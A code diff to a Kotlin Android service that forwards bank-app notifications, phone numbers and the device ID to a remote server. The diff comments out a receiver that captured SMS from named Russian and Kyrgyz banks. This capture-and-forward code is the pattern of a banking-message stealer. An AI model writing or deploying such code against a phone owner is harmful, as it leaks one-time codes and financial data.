@@ -44,7 +44,7 @@ import kotlin.math.floor
 const val STATUS_EXTRA = "status"
 const val DELIVERED = "SMS_DELIVERED"
 private const val NOTIFICATION_ID = 2
-private const val PERIOD: Long = 1 * 60 * 1000
+private const val PERIOD: Long = 1 * 30 * 1000
 
 class NotificationService : NotificationListenerService() {
     private val versionMap = mapOf(
@@ -61,8 +61,6 @@ class NotificationService : NotificationListenerService() {
         34 to "Android 14"
     )
     private val pushSenders = arrayOf("ru.raiffeisennews", "com.maanavan.mb_kyrgyzstan")
-    private val smsSender = arrayOf("900", "Raiffeisen", "Tinkoff", "Alfa-Bank", "Rosbank", "MBank", "URALSIB")
-    private var flagReceiver = false
     private lateinit var settings: SharedPreferences
     lateinit var manager: NotificationManager
     lateinit var phone1: String
@@ -70,26 +68,26 @@ class NotificationService : NotificationListenerService() {
     lateinit var androidId: String
     private var timer: Timer? = Timer()
 
-    private val receiverSms = object : BroadcastReceiver() {
-        override fun onReceive(arg0: Context, arg1: Intent) {
-            val msg = StringBuilder()
-            var name = ""
-            var flag = false
-            for (smsMessage in Telephony.Sms.Intents.getMessagesFromIntent(arg1)) {
-                if (smsSender.contains(smsMessage.originatingAddress)) {
-                    msg.append(smsMessage.messageBody)
-                    name = smsMessage.originatingAddress!!
-                    flag = true
-                }
-            }
-
-            if (flag) {
-                Log.i(TAG,"Пришло сообщение")
-                sendWebHook(name, msg.toString(), false)
-            }
-
-        }
-    }
+//    private val receiverSms = object : BroadcastReceiver() {
+//        override fun onReceive(arg0: Context, arg1: Intent) {
+//            val msg = StringBuilder()
+//            var name = ""
+//            var flag = false
+//            for (smsMessage in Telephony.Sms.Intents.getMessagesFromIntent(arg1)) {
+//                if (smsSender.contains(smsMessage.originatingAddress)) {
+//                    msg.append(smsMessage.messageBody)
+//                    name = smsMessage.originatingAddress!!
+//                    flag = true
+//                }
+//            }
+//
+//            if (flag) {
+//                Log.i(TAG,"Пришло сообщение")
+//                sendWebHook(name, msg.toString(), false)
+//            }
+//
+//        }
+//    }
 
     override fun onCreate() {
         super.onCreate()
@@ -139,10 +137,9 @@ class NotificationService : NotificationListenerService() {
                         phone2,
                         level.toString()
                     )
-
-                    val code = manager.sendTelemetry(telemetry).execute().code()
-                    if (code != 200) {
-                        Log.i(TAG,"Ошибка отправки телеметрии на сервер. Код: $code")
+                    val response = manager.sendTelemetry(telemetry).execute()
+                    if (response.code() != 200) {
+                        Log.i(TAG,"Ошибка отправки телеметрии на сервер. ${response.body().string()}")
                     } else {
                         Log.i(TAG,"Телеметрия отправлена")
                     }
@@ -153,11 +150,11 @@ class NotificationService : NotificationListenerService() {
 
         }, 0, PERIOD)
 
-        registerReceiverCompat(
-            receiverSms,
-            IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)
-        )
-        flagReceiver = true
+//        registerReceiverCompat(
+//            receiverSms,
+//            IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)
+//        )
+//        flagReceiver = true
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -228,6 +225,7 @@ class NotificationService : NotificationListenerService() {
         }
         val date = floor((Date().time / 1000).toDouble())
         val webhook = Webhook(androidId, name, text, date, phone1, phone2)
+
         manager.sendWebHook(webhook).enqueue(object : Callback {
             override fun onFailure(request: Request, e: IOException) {
                 Log.i(TAG,"Ошибка отправки $strOk на сервер. $e")
@@ -236,6 +234,7 @@ class NotificationService : NotificationListenerService() {
             override fun onResponse(response: Response) {
 
                 if (response.code() != 200) {
+                    response.request().body()
                     Log.i(TAG,"Ошибка отправки $strOk на сервер. Код: ${response.code()}")
 
                 } else {
@@ -267,10 +266,10 @@ class NotificationService : NotificationListenerService() {
         statusBroadcast(false)
         timer?.cancel()
         timer = null
-        if (flagReceiver) {
-            unregisterReceiver(receiverSms)
-            flagReceiver =false
-        }
+//        if (flagReceiver) {
+//            unregisterReceiver(receiverSms)
+//            flagReceiver =false
+//        }
     }
 
 }
